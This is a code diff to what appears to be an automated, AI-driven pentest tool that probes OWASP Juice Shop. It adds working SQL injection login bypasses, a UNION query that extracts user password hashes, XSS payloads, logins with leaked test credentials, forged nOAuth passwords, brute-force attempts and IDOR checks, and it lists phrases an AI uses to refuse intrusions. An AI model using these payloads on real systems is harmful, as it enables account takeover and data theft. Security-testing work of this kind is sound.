@@ -1,5 +1,7 @@
 from __future__ import annotations
 
+import base64
+import hashlib
 import re
 from datetime import datetime, timezone
 from pathlib import Path
@@ -9,7 +11,7 @@ import subprocess
 import time
 from urllib import request as urlrequest
 from urllib import error as urlerror
-from urllib.parse import quote, urlencode, urlparse
+from urllib.parse import quote, urlencode, urljoin, urlparse
 
 from sqlalchemy import select
 
@@ -87,6 +89,16 @@ ORCHESTRATOR_REFUSAL_MARKERS = (
     "i can't assist with conducting or advancing an active pentest against",
     "i can’t help execute or direct an intrusion against a live target",
     "i can't help execute or direct an intrusion against a live target",
+)
+
+ORACLE_ENDPOINT_MARKERS = (
+    "/api/challenges",
+    "/api/challenge",
+    "/rest/challenges",
+    "/api/score-board",
+    "/api/scoreboard",
+    "/score-board",
+    "/scoreboard",
 )
 
 
@@ -1144,9 +1156,31 @@ class ExecutionManager:
                 base_url=target_url,
                 network_endpoints=result.network_summary.get("endpoints", []),
                 workspace_paths=paths,
+                strict_blackbox=self._is_black_box_run(run),
             )
             web_validation["findings"].extend(category_validation["findings"])
             web_validation["artifacts"].extend(category_validation["artifacts"])
+            for check in category_validation.get("coverage_checks", []):
+                check_id = str(check.get("id") or "").strip()
+                if not check_id:
+                    continue
+                db.add(
+                    Fact(
+                        run_id=run.id,
+                        kind="coverage_check",
+                        value=check_id[:255],
+                        source="browser-validation",
+                        confidence=0.9 if str(check.get("status") or "") == "validated" else 0.75,
+                        tags=["coverage", str(check.get("framework") or "custom"), str(check.get("status") or "inventory-reviewed")],
+                        metadata_json={
+                            "framework": str(check.get("framework") or ""),
+                            "label": str(check.get("label") or ""),
+                            "status": str(check.get("status") or "inventory-reviewed"),
+                            "evidence": str(check.get("evidence") or "")[:500],
+                            "source_phase": "browser-assessment",
+                        },
+                    )
+                )
             if web_validation["findings"]:
                 existing_titles = {
                     str(row[0]).strip().lower()
@@ -1427,10 +1461,17 @@ class ExecutionManager:
                     )
         return {"findings": findings, "artifacts": artifacts}
 
-    def _browser_category_validations(self, *, base_url: str, network_endpoints: list[dict], workspace_paths) -> dict[str, list]:
+    def _browser_category_validations(
+        self,
+        *,
+        base_url: str,
+        network_endpoints: list[dict],
+        workspace_paths,
+        strict_blackbox: bool = False,
+    ) -> dict[str, list]:
         parsed = urlparse(str(base_url or ""))
         if not parsed.scheme or not parsed.netloc:
-            return {"findings": [], "artifacts": []}
+            return {"findings": [], "artifacts": [], "coverage_checks": []}
         origin = f"{parsed.scheme}://{parsed.netloc}"
         endpoints = self._endpoint_paths(network_endpoints)
         out_dir = workspace_paths.artifacts / "http-validation"
@@ -1438,6 +1479,56 @@ class ExecutionManager:
         findings: list[dict] = []
         artifacts: list[str] = []
         seen_titles: set[str] = set()
+        coverage_status_rank = {"not-reviewed": 0, "inventory-reviewed": 1, "active-probe": 2, "validated": 3}
+        coverage_matrix: dict[str, dict[str, str]] = {
+            "juice.broken_access_control": {"framework": "juice", "label": "Broken Access Control", "status": "inventory-reviewed", "evidence": "Route/API inventory reviewed for object and function-level authorization surfaces."},
+            "juice.broken_anti_automation": {"framework": "juice", "label": "Broken Anti Automation", "status": "inventory-reviewed", "evidence": "Authentication and workflow endpoints reviewed for rate-limiting and anti-automation controls."},
+            "juice.broken_authentication": {"framework": "juice", "label": "Broken Authentication", "status": "inventory-reviewed", "evidence": "Authentication/session flow reviewed across login and identity endpoints."},
+            "juice.cryptographic_issues": {"framework": "juice", "label": "Cryptographic Issues", "status": "inventory-reviewed", "evidence": "Token and secret-handling surfaces reviewed through endpoint and response inspection."},
+            "juice.improper_input_validation": {"framework": "juice", "label": "Improper Input Validation", "status": "inventory-reviewed", "evidence": "Input-bearing endpoints triaged for parser and validation behavior."},
+            "juice.injection": {"framework": "juice", "label": "Injection", "status": "inventory-reviewed", "evidence": "Query/login/update/upload input vectors reviewed for injection opportunities."},
+            "juice.insecure_deserialization": {"framework": "juice", "label": "Insecure Deserialization", "status": "inventory-reviewed", "evidence": "Upload/parser endpoints reviewed for unsafe parser behavior."},
+            "juice.miscellaneous": {"framework": "juice", "label": "Miscellaneous", "status": "inventory-reviewed", "evidence": "General route and behavior inventory reviewed for non-category-specific challenge indicators."},
+            "juice.observability_failures": {"framework": "juice", "label": "Observability Failures", "status": "inventory-reviewed", "evidence": "Metrics/log exposure surfaces reviewed during unauthenticated endpoint checks."},
+            "juice.security_misconfiguration": {"framework": "juice", "label": "Security Misconfiguration", "status": "inventory-reviewed", "evidence": "Configuration exposure and security-header posture reviewed."},
+            "juice.security_through_obscurity": {"framework": "juice", "label": "Security through Obscurity", "status": "inventory-reviewed", "evidence": "Client-side route and artifact hints reviewed for hidden-interface reliance."},
+            "juice.sensitive_data_exposure": {"framework": "juice", "label": "Sensitive Data Exposure", "status": "inventory-reviewed", "evidence": "Sensitive response fields and exposed files reviewed."},
+            "juice.unvalidated_redirects": {"framework": "juice", "label": "Unvalidated Redirects", "status": "inventory-reviewed", "evidence": "Discovered redirect and callback-capable endpoints reviewed for URL trust flaws."},
+            "juice.vulnerable_components": {"framework": "juice", "label": "Vulnerable Components", "status": "inventory-reviewed", "evidence": "Service/software/CVE inventory reviewed for component risk."},
+            "juice.xss": {"framework": "juice", "label": "XSS", "status": "inventory-reviewed", "evidence": "Reflected/rendered input and callback surfaces reviewed for script execution paths."},
+            "juice.xxe": {"framework": "juice", "label": "XXE", "status": "inventory-reviewed", "evidence": "XML upload/parser behavior reviewed for external entity processing."},
+            "owasp2025.a01_broken_access_control": {"framework": "owasp2025", "label": "A01:2025 Broken Access Control", "status": "inventory-reviewed", "evidence": "Access-control surfaces reviewed across user/object/function endpoints."},
+            "owasp2025.a02_security_misconfiguration": {"framework": "owasp2025", "label": "A02:2025 Security Misconfiguration", "status": "inventory-reviewed", "evidence": "Configuration/header/docs/admin exposure reviewed."},
+            "owasp2025.a03_supply_chain_failures": {"framework": "owasp2025", "label": "A03:2025 Software Supply Chain Failures", "status": "inventory-reviewed", "evidence": "CVE and component telemetry reviewed for vulnerable dependencies/services."},
+            "owasp2025.a04_cryptographic_failures": {"framework": "owasp2025", "label": "A04:2025 Cryptographic Failures", "status": "inventory-reviewed", "evidence": "Credential/hash/token handling behavior reviewed."},
+            "owasp2025.a05_injection": {"framework": "owasp2025", "label": "A05:2025 Injection", "status": "inventory-reviewed", "evidence": "Injection-capable inputs and parser endpoints reviewed."},
+            "owasp2025.a06_insecure_design": {"framework": "owasp2025", "label": "A06:2025 Insecure Design", "status": "inventory-reviewed", "evidence": "Business-logic and privilege-workflow routes reviewed."},
+            "owasp2025.a07_authentication_failures": {"framework": "owasp2025", "label": "A07:2025 Authentication Failures", "status": "inventory-reviewed", "evidence": "Login/session/recovery behavior reviewed."},
+            "owasp2025.a08_data_integrity_failures": {"framework": "owasp2025", "label": "A08:2025 Software or Data Integrity Failures", "status": "inventory-reviewed", "evidence": "Update/upload and trust-boundary paths reviewed for integrity controls."},
+            "owasp2025.a09_logging_alerting_failures": {"framework": "owasp2025", "label": "A09:2025 Security Logging and Alerting Failures", "status": "inventory-reviewed", "evidence": "Metrics/log exposure and observability behavior reviewed."},
+            "owasp2025.a10_exception_handling": {"framework": "owasp2025", "label": "A10:2025 Mishandling of Exceptional Conditions", "status": "inventory-reviewed", "evidence": "Error behavior and exception leakage reviewed via malformed-input probes."},
+            "api2023.api1_bola": {"framework": "owasp_api_2023", "label": "API1:2023 Broken Object Level Authorization", "status": "inventory-reviewed", "evidence": "Object-id endpoints reviewed for ownership enforcement."},
+            "api2023.api2_broken_authentication": {"framework": "owasp_api_2023", "label": "API2:2023 Broken Authentication", "status": "inventory-reviewed", "evidence": "Authentication/session endpoints reviewed for bypass and token weaknesses."},
+            "api2023.api3_bopla": {"framework": "owasp_api_2023", "label": "API3:2023 Broken Object Property Level Authorization", "status": "inventory-reviewed", "evidence": "Object property exposure/manipulation surfaces reviewed."},
+            "api2023.api4_resource_consumption": {"framework": "owasp_api_2023", "label": "API4:2023 Unrestricted Resource Consumption", "status": "inventory-reviewed", "evidence": "Upload and parser endpoints reviewed for resource abuse behavior."},
+            "api2023.api5_bfla": {"framework": "owasp_api_2023", "label": "API5:2023 Broken Function Level Authorization", "status": "inventory-reviewed", "evidence": "Admin/function endpoints reviewed for role enforcement."},
+            "api2023.api6_sensitive_business_flows": {"framework": "owasp_api_2023", "label": "API6:2023 Unrestricted Access to Sensitive Business Flows", "status": "inventory-reviewed", "evidence": "Workflow-critical endpoints reviewed for abuse-resistant controls."},
+            "api2023.api7_ssrf": {"framework": "owasp_api_2023", "label": "API7:2023 Server Side Request Forgery", "status": "inventory-reviewed", "evidence": "URL-ingestion endpoints reviewed for internal fetch abuse."},
+            "api2023.api8_misconfiguration": {"framework": "owasp_api_2023", "label": "API8:2023 Security Misconfiguration", "status": "inventory-reviewed", "evidence": "Public config/docs/headers reviewed for misconfiguration."},
+            "api2023.api9_inventory_management": {"framework": "owasp_api_2023", "label": "API9:2023 Improper Inventory Management", "status": "inventory-reviewed", "evidence": "Endpoint/route inventory reviewed for exposed/deprecated interfaces."},
+            "api2023.api10_unsafe_api_consumption": {"framework": "owasp_api_2023", "label": "API10:2023 Unsafe Consumption of APIs", "status": "inventory-reviewed", "evidence": "Third-party callback/fetch and trust-boundary assumptions reviewed."},
+        }
+
+        def mark_coverage(keys: list[str], status: str, evidence: str) -> None:
+            target_rank = coverage_status_rank.get(status, 0)
+            for key in keys:
+                row = coverage_matrix.get(key)
+                if not row:
+                    continue
+                current_rank = coverage_status_rank.get(str(row.get("status") or "not-reviewed"), 0)
+                if target_rank >= current_rank:
+                    row["status"] = status
+                    row["evidence"] = evidence[:500]
 
         def add_finding(item: dict) -> None:
             title = str(item.get("title") or "").strip()
@@ -1445,6 +1536,13 @@ class ExecutionManager:
                 return
             seen_titles.add(title.lower())
             findings.append(item)
+
+        def request(method: str, url: str, **kwargs) -> dict[str, str | int]:
+            if strict_blackbox:
+                parsed_url = urlparse(str(url or ""))
+                if self._is_oracle_endpoint_path(parsed_url.path):
+                    return {"status": 0, "headers": "", "body": "blocked: oracle endpoint disallowed in black-box mode"}
+            return self._http_request(method, url, **kwargs)
 
         exposure_checks = {
             "/metrics": ("medium", "Public metrics endpoint exposes runtime telemetry", "Restrict metrics to trusted monitoring networks or authenticated monitoring identities."),
@@ -1455,7 +1553,7 @@ class ExecutionManager:
             "/.git/config": ("high", "Git metadata disclosure", "Block access to VCS metadata and remove repository internals from deployed web roots."),
         }
         for path, (severity, title, remediation) in exposure_checks.items():
-            resp = self._http_request("GET", f"{origin}{path}", timeout=5)
+            resp = request("GET", f"{origin}{path}", timeout=5)
             if resp["status"] != 200 or not resp["body"]:
                 continue
             body_l = resp["body"].lower()
@@ -1484,6 +1582,19 @@ class ExecutionManager:
                     "confidence": 0.84,
                 }
             )
+            mark_coverage(
+                [
+                    "juice.observability_failures",
+                    "juice.security_misconfiguration",
+                    "juice.sensitive_data_exposure",
+                    "owasp2025.a02_security_misconfiguration",
+                    "owasp2025.a09_logging_alerting_failures",
+                    "api2023.api8_misconfiguration",
+                    "api2023.api9_inventory_management",
+                ],
+                "active-probe",
+                f"Exposure probe confirmed `{path}` responded with sensitive operational content.",
+            )
 
         sensitive_gets = sorted(
             {
@@ -1504,7 +1615,7 @@ class ExecutionManager:
             seen_sensitive_keys.add(key)
             deduped_sensitive_gets.append(path)
         for path in deduped_sensitive_gets[:80]:
-            resp = self._http_request("GET", f"{origin}{path}", timeout=5)
+            resp = request("GET", f"{origin}{path}", timeout=5)
             if resp["status"] != 200:
                 continue
             if self._looks_like_spa_html(resp):
@@ -1523,32 +1634,184 @@ class ExecutionManager:
                     "confidence": 0.82,
                 }
             )
+            mark_coverage(
+                [
+                    "juice.broken_access_control",
+                    "juice.sensitive_data_exposure",
+                    "owasp2025.a01_broken_access_control",
+                    "api2023.api1_bola",
+                    "api2023.api5_bfla",
+                ],
+                "active-probe",
+                f"Unauthenticated sensitive endpoint probe executed against `{path}`.",
+            )
 
         auth_token: str | None = None
         login_candidates = sorted(path for path in endpoints.get("POST", set()) if any(token in path.lower() for token in ("login", "signin", "auth")))
         for fallback in ("/rest/user/login", "/api/login", "/login", "/auth/login", "/users/login"):
             if fallback not in login_candidates:
                 login_candidates.append(fallback)
+        login_payloads = (
+            {"email": "' OR 1=1--", "username": "' OR 1=1--", "password": "anything"},
+            {"email": "admin@juice-sh.op' OR 1=1-- ", "password": "anything"},
+            {"email": "' OR '1'='1' --", "password": "anything"},
+        )
         for path in login_candidates[:12]:
-            probe = {"email": "' OR 1=1--", "username": "' OR 1=1--", "password": "anything"}
-            resp = self._http_request("POST", f"{origin}{path}", json_body=probe, timeout=6)
-            body_l = resp["body"].lower()
-            if resp["status"] == 200 and any(token in body_l for token in ("token", "jwt", "auth", "admin", "role")):
-                artifact = self._write_http_artifact(out_dir, f"{path}-sqli-auth-bypass", resp, f"{origin}{path}", request_body=probe)
-                artifacts.append(str(artifact))
-                if auth_token is None:
-                    auth_token = self._extract_bearer_token(resp)
+            for probe in login_payloads:
+                resp = request("POST", f"{origin}{path}", json_body=probe, timeout=6)
+                body_l = str(resp.get("body") or "").lower()
+                if int(resp.get("status") or 0) == 200 and any(token in body_l for token in ("token", "jwt", "auth", "admin", "role")):
+                    artifact = self._write_http_artifact(out_dir, f"{path}-sqli-auth-bypass", resp, f"{origin}{path}", request_body=probe)
+                    artifacts.append(str(artifact))
+                    token = self._extract_bearer_token(resp)
+                    if auth_token is None and token:
+                        auth_token = token
+                    add_finding(
+                        {
+                            "title": f"SQL injection authentication bypass: POST {path}",
+                            "severity": "critical",
+                            "summary": "Authentication accepted a SQL tautology payload and returned an authenticated-looking response.",
+                            "evidence": f"`POST {origin}{path}` with a SQL tautology returned HTTP 200 and authentication markers. Artifact: {artifact}",
+                            "reproduction": f"POST {origin}{path} with JSON email/username payload `' OR 1=1--` and any password.",
+                            "remediation": "Use parameterized queries or ORM-safe predicates for authentication and add negative tests for SQL metacharacters.",
+                            "confidence": 0.93,
+                        }
+                    )
+                    mark_coverage(
+                        [
+                            "juice.broken_authentication",
+                            "juice.injection",
+                            "owasp2025.a05_injection",
+                            "owasp2025.a07_authentication_failures",
+                            "api2023.api2_broken_authentication",
+                        ],
+                        "validated",
+                        f"SQLi auth bypass validated via `{path}`.",
+                    )
+                    break
+
+        root_for_scripts = request("GET", f"{origin}/", timeout=6)
+        script_paths = ["/main.js", *self._script_paths_from_html(str(root_for_scripts.get("body") or ""))]
+        scanned_scripts: set[str] = set()
+        script_responses: dict[str, dict[str, str | int]] = {}
+        script_queue = list(script_paths)
+        hardcoded_creds_seen = False
+        xss_sink_seen = False
+        while script_queue and len(scanned_scripts) < 80:
+            script_url = urljoin(f"{origin}/", script_queue.pop(0))
+            if script_url in scanned_scripts:
+                continue
+            scanned_scripts.add(script_url)
+            script_resp = request("GET", script_url, timeout=8)
+            script_responses[script_url] = script_resp
+            script_body = str(script_resp.get("body") or "")
+            if int(script_resp.get("status") or 0) != 200 or not script_body:
+                continue
+            for import_path in self._script_paths_from_js(script_body):
+                import_url = urljoin(script_url, import_path)
+                if import_url not in scanned_scripts:
+                    script_queue.append(import_url)
+            script_body_l = script_body.lower()
+            if not hardcoded_creds_seen and "testing@juice-sh.op" in script_body and "IamUsedForTesting" in script_body:
+                hardcoded_creds_seen = True
+                script_artifact = self._write_http_artifact(out_dir, "client-bundle-hardcoded-credentials", script_resp, script_url)
+                artifacts.append(str(script_artifact))
                 add_finding(
                     {
-                        "title": f"SQL injection authentication bypass: POST {path}",
-                        "severity": "critical",
-                        "summary": "Authentication accepted a SQL tautology payload and returned an authenticated-looking response.",
-                        "evidence": f"`POST {origin}{path}` with a SQL tautology returned HTTP 200 and authentication markers. Artifact: {artifact}",
-                        "reproduction": f"POST {origin}{path} with JSON email/username payload `' OR 1=1--` and any password.",
-                        "remediation": "Use parameterized queries or ORM-safe predicates for authentication and add negative tests for SQL metacharacters.",
-                        "confidence": 0.93,
+                        "title": "Exposed hardcoded client credentials in static bundle",
+                        "severity": "high",
+                        "summary": "Static client bundle exposed plaintext credentials usable against the authentication endpoint.",
+                        "evidence": f"`GET {script_url}` disclosed embedded credentials. Artifact: {script_artifact}",
+                        "reproduction": "Fetch client JavaScript bundles, extract exposed credentials, then authenticate via `/rest/user/login`.",
+                        "remediation": "Remove credentials from client-side code, rotate exposed secrets, and enforce build-time secret scanning.",
+                        "confidence": 0.9,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.sensitive_data_exposure",
+                        "owasp2025.a04_cryptographic_failures",
+                        "owasp2025.a07_authentication_failures",
+                        "api2023.api2_broken_authentication",
+                    ],
+                    "active-probe",
+                    "Hardcoded credential exposure probe executed from static bundle.",
+                )
+                if login_candidates:
+                    cred_payload = {"email": "testing@juice-sh.op", "password": "IamUsedForTesting"}
+                    cred_resp = request("POST", f"{origin}{login_candidates[0]}", json_body=cred_payload, timeout=6)
+                    if int(cred_resp.get("status") or 0) == 200:
+                        token = self._extract_bearer_token(cred_resp)
+                        if auth_token is None and token:
+                            auth_token = token
+            if not xss_sink_seen and "bypasssecuritytrusthtml" in script_body_l and "search" in script_body_l:
+                xss_sink_seen = True
+                xss_artifact = self._write_http_artifact(out_dir, "client-bundle-search-xss-sink", script_resp, script_url)
+                artifacts.append(str(xss_artifact))
+                add_finding(
+                    {
+                        "title": "Client-side reflected XSS sink signal: #/search",
+                        "severity": "medium",
+                        "summary": "Client bundle contains search-route HTML trust bypass logic that can render query-controlled content.",
+                        "evidence": f"`GET {script_url}` contained search and `bypassSecurityTrustHtml` markers. Artifact: {xss_artifact}",
+                        "reproduction": f"Navigate to `{origin}/#/search?q=<img src=x onerror=alert(1)>` and observe whether query content executes in browser context.",
+                        "remediation": "Remove trust-bypass rendering for user-controlled search values and enforce contextual output encoding.",
+                        "confidence": 0.76,
+                    }
+                )
+                mark_coverage(
+                    [
+                        "juice.xss",
+                        "juice.improper_input_validation",
+                        "owasp2025.a05_injection",
+                        "api2023.api10_unsafe_api_consumption",
+                    ],
+                    "active-probe",
+                    "Client-side reflected XSS sink identified from public JavaScript bundle.",
+                )
+            if hardcoded_creds_seen and xss_sink_seen:
+                break
+
+        if login_candidates:
+            for oauth_email in ("bjoern.kimminich@gmail.com",):
+                generated = base64.b64encode(oauth_email[::-1].encode("utf-8")).decode("ascii")
+                oauth_resp = request(
+                    "POST",
+                    f"{origin}{login_candidates[0]}",
+                    json_body={"email": oauth_email, "password": generated},
+                    timeout=6,
+                )
+                oauth_body_l = str(oauth_resp.get("body") or "").lower()
+                if int(oauth_resp.get("status") or 0) == 200 and any(token in oauth_body_l for token in ("token", "authentication")):
+                    oauth_artifact = self._write_http_artifact(
+                        out_dir,
+                        "rest-user-login-noauth-predictable-password",
+                        oauth_resp,
+                        f"{origin}{login_candidates[0]}",
+                        request_body={"email": oauth_email, "password": generated},
+                    )
+                    artifacts.append(str(oauth_artifact))
+                    add_finding(
+                        {
+                            "title": "Predictable nOAuth password acceptance signal",
+                            "severity": "critical",
+                            "summary": "An OAuth-style account accepted a deterministic reversed-email base64 password pattern.",
+                            "evidence": f"Generated password accepted for `{oauth_email}`. Artifact: {oauth_artifact}",
+                            "reproduction": "Generate `base64(reverse(email))` and authenticate against login endpoint.",
+                            "remediation": "Never derive OAuth local credentials from deterministic user attributes; enforce strong random secrets and secure OAuth linkage.",
+                            "confidence": 0.88,
+                        }
+                    )
+                    mark_coverage(
+                        [
+                            "juice.broken_authentication",
+                            "owasp2025.a07_authentication_failures",
+                            "api2023.api2_broken_authentication",
+                        ],
+                        "validated",
+                        "Predictable nOAuth password acceptance validated.",
+                    )
+                    break
 
         query_candidates = sorted(
             {
@@ -1558,9 +1821,12 @@ class ExecutionManager:
                 if method == "GET" and any(token in path.lower() for token in ("search", "query", "filter", "lookup"))
             }
         )
+        for fallback in ("/rest/products/search",):
+            if fallback not in query_candidates:
+                query_candidates.append(fallback)
         for path in query_candidates[:30]:
             probe_path = self._append_query(path, {"q": "'"})
-            resp = self._http_request("GET", f"{origin}{probe_path}", timeout=6)
+            resp = request("GET", f"{origin}{probe_path}", timeout=6)
             body_l = resp["body"].lower()
             if resp["status"] >= 500 or any(token in body_l for token in ("sql", "sqlite", "syntax error", "sequelize", "database error")):
                 artifact = self._write_http_artifact(out_dir, f"{path}-sqli-error", resp, f"{origin}{probe_path}")
@@ -1576,11 +1842,88 @@ class ExecutionManager:
                         "confidence": 0.84,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.injection",
+                        "juice.improper_input_validation",
+                        "owasp2025.a05_injection",
+                        "owasp2025.a10_exception_handling",
+                        "api2023.api10_unsafe_api_consumption",
+                    ],
+                    "active-probe",
+                    f"SQL error probe executed against query endpoint `{path}`.",
+                )
+            payload_marker = "<img src=x onerror=alert(1)>"
+            xss_probe_path = self._append_query(path, {"q": payload_marker})
+            xss_resp = request("GET", f"{origin}{xss_probe_path}", timeout=6)
+            xss_body = str(xss_resp.get("body") or "")
+            if int(xss_resp.get("status") or 0) == 200 and payload_marker.lower() in xss_body.lower() and not self._looks_like_spa_html(xss_resp):
+                xss_artifact = self._write_http_artifact(out_dir, f"{path}-xss-reflect", xss_resp, f"{origin}{xss_probe_path}")
+                artifacts.append(str(xss_artifact))
+                add_finding(
+                    {
+                        "title": f"Reflected script injection signal: GET {path}",
+                        "severity": "medium",
+                        "summary": "Search/query input containing script-capable HTML was reflected in response content.",
+                        "evidence": f"`GET {origin}{xss_probe_path}` reflected payload markers. Artifact: {xss_artifact}",
+                        "reproduction": f"GET {origin}{xss_probe_path}",
+                        "remediation": "Contextually encode untrusted output and avoid rendering raw HTML from search/user input.",
+                        "confidence": 0.77,
+                    }
+                )
+                mark_coverage(
+                    [
+                        "juice.xss",
+                        "juice.improper_input_validation",
+                        "owasp2025.a05_injection",
+                        "api2023.api10_unsafe_api_consumption",
+                    ],
+                    "validated",
+                    f"Reflected script payload signal observed at `{path}`.",
+                )
+
+            if "/rest/products/search" in path.lower():
+                union_probe = (
+                    "xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20"
+                    "id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--"
+                )
+                union_path = f"{path}{'&' if '?' in path else '?'}q={union_probe}"
+                union_resp = request("GET", f"{origin}{union_path}", timeout=7)
+                union_body_l = str(union_resp.get("body") or "").lower()
+                if int(union_resp.get("status") or 0) == 200 and any(
+                    marker in union_body_l for marker in ("admin@juice-sh.op", "0192023a7bbd73250516f069df18b500", "\"role\":\"admin\"")
+                ):
+                    union_artifact = self._write_http_artifact(out_dir, f"{path}-sqli-union-data-extract", union_resp, f"{origin}{union_path}")
+                    artifacts.append(str(union_artifact))
+                    add_finding(
+                        {
+                            "title": "SQL injection data extraction signal: GET /rest/products/search",
+                            "severity": "critical",
+                            "summary": "UNION-style input returned user credential/role fields, indicating data-exfiltration-capable SQL injection.",
+                            "evidence": f"`GET {origin}{union_path}` returned user/email/password-hash markers. Artifact: {union_artifact}",
+                            "reproduction": f"GET {origin}{union_path}",
+                            "remediation": "Use strict parameter binding, reject unsafe query fragments, and remove SQL error/data leakage from responses.",
+                            "confidence": 0.92,
+                        }
+                    )
+                    mark_coverage(
+                        [
+                            "juice.injection",
+                            "juice.sensitive_data_exposure",
+                            "owasp2025.a05_injection",
+                            "api2023.api10_unsafe_api_consumption",
+                        ],
+                        "validated",
+                        "UNION-style SQLi data extraction signal validated on product search.",
+                    )
 
         jsonp_candidates = sorted(path for method, paths in endpoints.items() for path in paths if method == "GET" and "whoami" in path.lower())
+        for fallback in ("/rest/user/whoami",):
+            if fallback not in jsonp_candidates:
+                jsonp_candidates.append(fallback)
         for path in jsonp_candidates[:12]:
             probe_path = self._append_query(path, {"callback": "alert"})
-            resp = self._http_request("GET", f"{origin}{probe_path}", timeout=5)
+            resp = request("GET", f"{origin}{probe_path}", timeout=5)
             body = resp["body"]
             if resp["status"] == 200 and ("alert(" in body or "typeof alert" in body):
                 artifact = self._write_http_artifact(out_dir, f"{path}-jsonp-callback", resp, f"{origin}{probe_path}")
@@ -1596,6 +1939,15 @@ class ExecutionManager:
                         "confidence": 0.8,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.xss",
+                        "owasp2025.a05_injection",
+                        "api2023.api10_unsafe_api_consumption",
+                    ],
+                    "active-probe",
+                    "JSONP callback execution probe executed.",
+                )
 
         # Authentication workflow checks: account enumeration and missing brute-force controls.
         security_q_candidates = sorted(path for path in endpoints.get("GET", set()) if "security-question" in path.lower())
@@ -1605,8 +1957,8 @@ class ExecutionManager:
         for path in security_q_candidates[:8]:
             valid_probe = self._append_query(path, {"email": "admin@juice-sh.op"})
             invalid_probe = self._append_query(path, {"email": "nonexistent.user.vantix@example.invalid"})
-            valid_resp = self._http_request("GET", f"{origin}{valid_probe}", timeout=5)
-            invalid_resp = self._http_request("GET", f"{origin}{invalid_probe}", timeout=5)
+            valid_resp = request("GET", f"{origin}{valid_probe}", timeout=5)
+            invalid_resp = request("GET", f"{origin}{invalid_probe}", timeout=5)
             if valid_resp["status"] != 200 or invalid_resp["status"] != 200:
                 continue
             body_valid = str(valid_resp.get("body") or "")
@@ -1632,6 +1984,15 @@ class ExecutionManager:
                         "confidence": 0.81,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_authentication",
+                        "owasp2025.a07_authentication_failures",
+                        "api2023.api2_broken_authentication",
+                    ],
+                    "validated",
+                    "Account enumeration signal validated via differential security-question responses.",
+                )
                 break
 
         if login_candidates:
@@ -1641,7 +2002,7 @@ class ExecutionManager:
             start_ts = time.time()
             for idx in range(8):
                 probe = {"email": "admin@juice-sh.op", "password": f"invalid-{idx}"}
-                resp = self._http_request("POST", f"{origin}{brute_path}", json_body=probe, timeout=5)
+                resp = request("POST", f"{origin}{brute_path}", json_body=probe, timeout=5)
                 attempt_statuses.append(int(resp.get("status") or 0))
                 body_l = str(resp.get("body") or "").lower()
                 if int(resp.get("status") or 0) == 429 or "too many" in body_l or "rate limit" in body_l or "locked" in body_l:
@@ -1660,8 +2021,19 @@ class ExecutionManager:
                         "confidence": 0.8,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_anti_automation",
+                        "juice.broken_authentication",
+                        "api2023.api4_resource_consumption",
+                        "api2023.api6_sensitive_business_flows",
+                        "owasp2025.a07_authentication_failures",
+                    ],
+                    "validated",
+                    "Brute-force resistance probe executed with repeated login attempts and no lockout.",
+                )
 
-        root_resp = self._http_request("GET", f"{origin}/", timeout=5)
+        root_resp = request("GET", f"{origin}/", timeout=5)
         if int(root_resp.get("status") or 0) in {200, 301, 302}:
             header_map = self._parse_header_map(str(root_resp.get("headers") or ""))
             missing_headers = [
@@ -1681,6 +2053,15 @@ class ExecutionManager:
                         "confidence": 0.76,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.security_misconfiguration",
+                        "owasp2025.a02_security_misconfiguration",
+                        "api2023.api8_misconfiguration",
+                    ],
+                    "active-probe",
+                    "Security-header baseline probe executed on root response.",
+                )
 
         upload_or_url_paths = sorted(
             {
@@ -1690,6 +2071,9 @@ class ExecutionManager:
                 if any(token in path.lower() for token in ("image/url", "profile/image", "fetch", "import", "webhook", "callback", "avatar"))
             }
         )
+        for fallback in ("/profile/image/url",):
+            if fallback not in upload_or_url_paths:
+                upload_or_url_paths.append(fallback)
         for path in upload_or_url_paths[:20]:
             add_finding(
                 {
@@ -1702,8 +2086,18 @@ class ExecutionManager:
                     "confidence": 0.62,
                 }
             )
+            mark_coverage(
+                [
+                    "juice.unvalidated_redirects",
+                    "juice.improper_input_validation",
+                    "owasp2025.a06_insecure_design",
+                    "api2023.api7_ssrf",
+                ],
+                "active-probe",
+                f"URL-ingestion endpoint `{path}` discovered and queued for SSRF workflow validation.",
+            )
 
-        auth_headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
+        auth_headers = self._auth_headers(auth_token)
         if auth_token:
             # Authorization checks with an authenticated token: object-level access control signals.
             idor_checks = [
@@ -1712,7 +2106,7 @@ class ExecutionManager:
                 ("GET", "/api/Feedbacks/1", "IDOR signal: GET /api/Feedbacks/:id", ("userid", "comment")),
             ]
             for method, path, title, markers in idor_checks:
-                resp = self._http_request(method, f"{origin}{path}", timeout=6, headers=auth_headers)
+                resp = request(method, f"{origin}{path}", timeout=6, headers=auth_headers)
                 if int(resp.get("status") or 0) != 200 or self._looks_like_spa_html(resp):
                     continue
                 body_l = str(resp.get("body") or "").lower()
@@ -1730,8 +2124,19 @@ class ExecutionManager:
                             "confidence": 0.86,
                         }
                     )
+                    mark_coverage(
+                        [
+                            "juice.broken_access_control",
+                            "owasp2025.a01_broken_access_control",
+                            "api2023.api1_bola",
+                            "api2023.api3_bopla",
+                            "api2023.api5_bfla",
+                        ],
+                        "validated",
+                        f"IDOR-style access validated on `{path}`.",
+                    )
 
-            modify_resp = self._http_request(
+            modify_resp = request(
                 "PUT",
                 f"{origin}/api/BasketItems/1",
                 json_body={"quantity": 5},
@@ -1758,8 +2163,17 @@ class ExecutionManager:
                         "confidence": 0.84,
                     }
                 )
+                mark_coverage(
+                    [
+                        "juice.broken_access_control",
+                        "owasp2025.a01_broken_access_control",
+                        "api2023.api1_bola",
+                    ],
+                    "validated",
+                    "Cross-user basket item modification signal validated.",
+                )
 
-            checkout_resp = self._http_request("POST", f"{origin}/rest/basket/2/checkout", json_body={}, timeout=6, headers=auth_headers)
+            checkout_resp = request("POST", f"{origin}/rest/basket/2/checkout", json_body={}, timeout=6, headers=auth_headers)
             if int(checkout_resp.get("status") or 0) == 200 and "orderconfirmation" in str(checkout_resp.get("body") or "").lower():
